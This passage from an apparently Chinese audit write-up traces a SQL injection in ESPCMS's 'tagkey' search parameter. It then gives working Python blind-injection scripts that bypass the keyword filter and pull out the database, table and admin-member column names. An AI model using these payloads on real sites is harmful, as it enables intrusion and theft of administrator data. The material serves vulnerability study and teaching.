class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$rsList</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">db</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">fetch_assoc</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$rs</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t\t\t<span class=\"token variable\">$rsList</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'typename'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">get_type</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$rsList</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'tid'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'typename'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t<span class=\"token variable\">$rsList</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'link'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">get_link</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'doc'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$rsList</span><span class=\"token punctuation\">,</span> admin_LNG<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t<span class=\"token variable\">$rsList</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'buylink'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">get_link</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'buylink'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$rsList</span><span class=\"token punctuation\">,</span> admin_LNG<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t<span class=\"token variable\">$rsList</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'enqlink'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">get_link</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'enqlink'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$rsList</span><span class=\"token punctuation\">,</span> admin_LNG<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t<span class=\"token variable\">$rsList</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'ctitle'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">empty</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$rsList</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'color'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token variable\">$rsList</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'title'</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">:</span> <span class=\"token string double-quoted-string\">\"&lt;font color='\"</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$rsList</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'color'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\"'&gt;\"</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$rsList</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'title'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\"&lt;/font&gt;\"</span><span class=\"token punctuation\">;</span>\n\t\t\t<span class=\"token variable\">$rsList</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$keyname</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_ireplace</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$keyword</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'&lt;font color=\"#F00000\"&gt;&lt;u&gt;'</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$keyword</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'&lt;/u&gt;&lt;/font&gt;'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$rsList</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$keyname</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t<span class=\"token variable\">$array</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$rsList</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token punctuation\">}</span>\n\t\t<span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">pagetemplate</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">assign</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'pagetext'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">htmlpage</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">PageStat</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">lng</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'pagetext'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">pagetemplate</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">assign</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'pagebotton'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">htmlpage</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">PageList</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">pagetemplate</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">assign</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'pagenu'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">htmlpage</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">Bottonstyle</span><span class=\"token punctuation\">(</span><span class=\"token constant boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">pagetemplate</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">assign</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'pagese'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">htmlpage</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">pageSelect</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">pagetemplate</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">assign</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'pagevt'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">htmlpage</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">Prevbotton</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n\t\t<span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">pagetemplate</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">assign</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'array'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$array</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">pagetemplate</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">assign</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'path'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'search'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">unset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$array</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$typeread</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$modelview</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$LANPACK</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">lng</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">pagetemplate</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">display</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$templatefilename</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'search'</span><span class=\"token punctuation\">,</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$filename</span><span class=\"token punctuation\">,</span> admin_LNG<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>里面的几条重要语句</p>\n<p><code>$tagkey = urldecode($this-&gt;fun-&gt;accept('tagkey', 'R'));</code>这句语句就是漏洞的根源，fun先检测，urlencode再转义</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token keyword\">empty</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$tagkey</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t\t\t<span class=\"token variable\">$db_where</span><span class=\"token operator\">.=</span><span class=\"token string double-quoted-string\">\" AND FIND_IN_SET('<span class=\"token interpolation\"><span class=\"token variable\">$tagkey</span></span>',tags)\"</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>不为空就拼接成where子句</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token variable\">$sql</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"SELECT did,lng,pid,mid,aid,tid,sid,fgid,linkdid,isclass,islink,ishtml,ismess,isorder,purview,recommend,tsn,title,longtitle,color,author,source,pic,link,oprice,bprice,click,description,keywords,addtime,template,filename,filepath FROM <span class=\"token interpolation\"><span class=\"token variable\">$db_table</span></span> <span class=\"token interpolation\"><span class=\"token variable\">$db_where</span></span> LIMIT 0,<span class=\"token interpolation\"><span class=\"token variable\">$pagemax</span></span>\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$rs</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">db</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$sql</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>创建并且执行sql语句，可以看到中间并没有其他的手段</p>\n<p><img src=\"https://images.dadream.eu.org/images/2024/07/e9cb89dac59d7cb4a2030af0d3f947be.png\"></p>\n<p>在如图添加一条回显，方便调试</p>\n<p><img src=\"https://images.dadream.eu.org/images/2024/07/22db695e34dfe109a22d0f070b6d83a9.png\"></p>\n<p>可以看到单引号被转义了，这时利用<code>urldecode()</code>的特性，报错存在注入</p>\n<p><img src=\"https://images.dadream.eu.org/images/2024/07/dcbb61fbf9e911eed98d38a406c7a466.png\"></p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token variable\">$db_where</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">' WHERE lng=\\''</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$lng</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'\\' AND isclass=1'</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$db_where</span><span class=\"token operator\">.=</span><span class=\"token string double-quoted-string\">\" AND FIND_IN_SET('<span class=\"token interpolation\"><span class=\"token variable\">$tagkey</span></span>',tags)\"</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>有这两条语句得到测试payload</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">http:<span class=\"token comment\">//localhost/espcms/index.php?ac=search&amp;at=taglist&amp;tagkey=1%2527,tags) or 1=1 %23</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>返回结果为真</p>\n<p><img src=\"https://images.dadream.eu.org/images/2024/07/c8bc7735d13bbba8b53d3fdb90b0e277.png\"></p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">http:<span class=\"token comment\">//localhost/espcms/index.php?ac=search&amp;at=taglist&amp;tagkey=1%2527,tags) or 1=2 %23</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>返回结果为假<img src=\"https://z3.ax1x.com/2021/11/25/oArAbt.png\" alt=\"oArAbt.png\"></p>\n<p>可以将”暂无内容”设为盲注的标准</p>\n<p>测试注入数据库长度</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">http:<span class=\"token comment\">//localhost/espcms/index.php?ac=search&amp;at=taglist&amp;tagkey=1%2527,tags) or (seleselectct length(database())=9)  %23</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://images.dadream.eu.org/images/2024/07/31d5b56cb336e7a83ab881317b023504.png\"></p>\n<p>相符合，其他的用脚本就能跑出来</p>\n<h2 id=\"脚本演示\"><a href=\"#脚本演示\" class=\"headerlink\" title=\"脚本演示\"></a>脚本演示</h2><h3 id=\"爆数据库长度\"><a href=\"#爆数据库长度\" class=\"headerlink\" title=\"爆数据库长度\"></a>爆数据库长度</h3><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> requests\n\nurl <span class=\"token operator\">=</span> <span class=\"token string\">\"http://localhost/espcms/index.php?ac=search&amp;at=taglist&amp;tagkey=1%2527,tags) \"</span>\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    payload <span class=\"token operator\">=</span> <span class=\"token string\">r'or (seleselectct length(database()))={} %23'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span>\n    r <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>url <span class=\"token operator\">+</span> payload<span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">if</span> <span class=\"token string\">\"暂无内容\"</span> <span class=\"token keyword\">not</span> <span class=\"token keyword\">in</span> r<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        \n        \n <span class=\"token comment\"># 9</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"爆数据库名\"><a href=\"#爆数据库名\" class=\"headerlink\" title=\"爆数据库名\"></a>爆数据库名</h3><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> requests\n\nurl <span class=\"token operator\">=</span> <span class=\"token string\">\"http://localhost/espcms/index.php?ac=search&amp;at=taglist&amp;tagkey=1%2527,tags) \"</span>\ndatabase_length <span class=\"token operator\">=</span> <span class=\"token number\">9</span>\ndatabase_name <span class=\"token operator\">=</span> <span class=\"token string\">''</span>\n\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> database_length <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">for</span> j <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        payload <span class=\"token operator\">=</span> <span class=\"token string\">r'or ascii(substr((seleselectct database()),{0}, 1))={1} %23'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span> j<span class=\"token punctuation\">)</span>\n        r <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>url <span class=\"token operator\">+</span> payload<span class=\"token punctuation\">)</span>\n\n        <span class=\"token keyword\">if</span> <span class=\"token string\">\"暂无内容\"</span> <span class=\"token keyword\">not</span> <span class=\"token keyword\">in</span> r<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">:</span>\n            database_name <span class=\"token operator\">+=</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>j<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>database_name<span class=\"token punctuation\">)</span>\n\n\n<span class=\"token triple-quoted-string string\">'''\ne\nes\nesp\nespc\nespcm\nespcms\nespcms_\nespcms_v\nespcms_v5\n\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"爆表的长度（第一个表）\"><a href=\"#爆表的长度（第一个表）\" class=\"headerlink\" title=\"爆表的长度（第一个表）\"></a>爆表的长度（第一个表）</h3><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> requests\n\nurl <span class=\"token operator\">=</span> <span class=\"token string\">\"http://localhost/espcms/index.php?ac=search&amp;at=taglist&amp;tagkey=1%2527,tags) \"</span>\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    payload <span class=\"token operator\">=</span> <span class=\"token string\">r'or (seleselectct length(table_name) frfromom information_schema.tables whwhereere table_schema=database() limit 0,1)={} %23'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span>\n    r <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>url <span class=\"token operator\">+</span> payload<span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">if</span> <span class=\"token string\">\"暂无内容\"</span> <span class=\"token keyword\">not</span> <span class=\"token keyword\">in</span> r<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n        \n<span class=\"token comment\"># 19</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>要爆其他表可以在<code>limit</code>的第一参数更改，或者再加一个循环</p>\n<h3 id=\"爆表名\"><a href=\"#爆表名\" class=\"headerlink\" title=\"爆表名\"></a>爆表名</h3><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> requests\n\nurl <span class=\"token operator\">=</span> <span class=\"token string\">\"http://localhost/espcms/index.php?ac=search&amp;at=taglist&amp;tagkey=1%2527,tags) \"</span>\ntable_length <span class=\"token operator\">=</span> <span class=\"token number\">19</span>\ntable_name <span class=\"token operator\">=</span> <span class=\"token string\">''</span>\n\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> table_length <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">for</span> j <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        payload <span class=\"token operator\">=</span> <span class=\"token string\">r'or ascii(substr((seleselectct table_name frfromom information_schema.tables whwhereere table_schema=database() limit 0,1),{0}, 1))={1} %23'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span> j<span class=\"token punctuation\">)</span>\n        r <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>url <span class=\"token operator\">+</span> payload<span class=\"token punctuation\">)</span>\n\n        <span class=\"token keyword\">if</span> <span class=\"token string\">\"暂无内容\"</span> <span class=\"token keyword\">not</span> <span class=\"token keyword\">in</span> r<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">:</span>\n            table_name <span class=\"token operator\">+=</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>j<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>table_name<span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># xxxxxxxadmin_member</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"爆列的长度\"><a href=\"#爆列的长度\" class=\"headerlink\" title=\"爆列的长度\"></a>爆列的长度</h3><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> requests\n\nurl <span class=\"token operator\">=</span> <span class=\"token string\">\"http://localhost/espcms/index.php?ac=search&amp;at=taglist&amp;tagkey=1%2527,tags) \"</span>\ntable_name <span class=\"token operator\">=</span> <span class=\"token string\">'xxxxxxxadmin_member'</span>\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    payload <span class=\"token operator\">=</span> <span class=\"token string\">r'or (seleselectct length(column_name) frfromom information_schema.columns whwhereere table_name=%2527{0}%2527 limit 0,1)={1} %23'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>table_name<span class=\"token punctuation\">,</span> i<span class=\"token punctuation\">)</span>\n    r <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>url <span class=\"token operator\">+</span> payload<span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">if</span> <span class=\"token string\">\"暂无内容\"</span> <span class=\"token keyword\">not</span> <span class=\"token keyword\">in</span> r<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        \n        \n        \n<span class=\"token comment\"># 2</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"爆列名\"><a href=\"#爆列名\" class=\"headerlink\" title=\"爆列名\"></a>爆列名</h3><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> requests\n\nurl <span class=\"token operator\">=</span> <span class=\"token string\">\"http://localhost/espcms/index.php?ac=search&amp;at=taglist&amp;tagkey=1%2527,tags) \"</span>\ncolumn_length <span class=\"token operator\">=</span> <span class=\"token number\">2</span>\ntable_name <span class=\"token operator\">=</span> <span class=\"token string\">'xxxxxxxadmin_member'</span>\ncolumn_name <span class=\"token operator\">=</span> <span class=\"token string\">''</span>\n\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> column_length <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">for</span> j <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        payload <span class=\"token operator\">=</span> <span class=\"token string\">r'or ascii(substr((seleselectct column_name frfromom information_schema.columns whwhereere table_name=%2527{0}%2527 limit 0,1),{1}, 1))={2} %23'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>table_name<span class=\"token punctuation\">,</span> i<span class=\"token punctuation\">,</span> j<span class=\"token punctuation\">)</span>\n        r <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>url <span class=\"token operator\">+</span> payload<span class=\"token punctuation\">)</span>\n\n        <span class=\"token keyword\">if</span> <span class=\"token string\">\"暂无内容\"</span> <span class=\"token keyword\">not</span> <span class=\"token keyword\">in</span> r<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">:</span>\n            column_name <span class=\"token operator\">+=</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>j<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>column_name<span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># id</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"爆值的长度\"><a href=\"#爆值的长度\" class=\"headerlink\" title=\"爆值的长度\"></a>爆值的长度</h3><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> requests\n\nurl <span class=\"token operator\">=</span> <span class=\"token string\">\"http://localhost/espcms/index.php?ac=search&amp;at=taglist&amp;tagkey=1%2527,tags) \"</span>\ncolumn_name <span class=\"token operator\">=</span> <span class=\"token string\">'id'</span>\ntable_name <span class=\"token operator\">=</span> <span class=\"token string\">'xxxxxxxadmin_member'</span>\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span 